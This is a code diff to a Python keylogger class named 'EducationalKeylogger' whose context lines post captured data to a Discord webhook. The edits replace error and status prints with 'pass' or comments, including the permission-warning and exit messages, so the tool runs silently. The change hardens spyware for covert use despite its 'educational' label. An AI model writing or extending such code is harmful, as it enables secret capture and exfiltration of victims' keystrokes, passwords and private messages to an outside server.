@@ -78,8 +78,7 @@ class EducationalKeylogger:
                 requests.post(self.webhook_url, json=data)
                 time.sleep(1)  # Rate limiting
             except Exception as e:
-                print(f"Failed to send to Discord: {e}")
-        
+                pass
         # Save to file as backup
         self.save_to_file()
         
@@ -119,11 +118,11 @@ def main():
         try:
             keylogger.start()
         except KeyboardInterrupt:
-            print("\nStopping keylogger...")
+            #print("\nStopping keylogger...")
             keylogger.send_to_discord()  # Send final report
-            print("Final report sent. Exiting.")
+            #print("Final report sent. Exiting.")
     else:
-        print("You must have permission to run this tool.")
+        #print("You must have permission to run this tool.")
         sys.exit(1)
 
 if __name__ == "__main__":
@@ -132,8 +131,8 @@ if __name__ == "__main__":
         import pynput
         import requests
     except ImportError as e:
-        print(f"Missing required module: {e}")
-        print("Install with: pip install pynput requests")
+        #print(f"Missing required module: {e}")
+        #print("Install with: pip install pynput requests")
         sys.exit(1)
     
     main()
